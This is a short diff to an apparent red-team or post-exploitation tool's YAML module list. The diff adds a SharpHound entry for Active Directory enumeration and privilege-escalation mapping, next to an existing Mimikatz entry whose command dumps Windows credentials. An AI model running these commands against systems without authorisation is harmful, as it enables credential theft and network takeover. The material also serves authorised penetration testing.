@@ -4,3 +4,9 @@ mimikatz_dumpcreds:
   command: 'Invoke-Mimikatz -Command privilege::debug; Invoke-Mimikatz -DumpCreds'
   type: "windows"
   description: "Dumps credentials from a windows host. Requires admin privileges."
+sharphound:
+  name: "Invoke-Bloodhound"
+  filename: "SharpHound.ps1"
+  command: 'Invoke-Bloodhound'
+  type: "windows"
+  description: "Get privilege escalation vectors and enumerate an active directory environment. Downloads data to analyze in BloodHound GUI on your host."
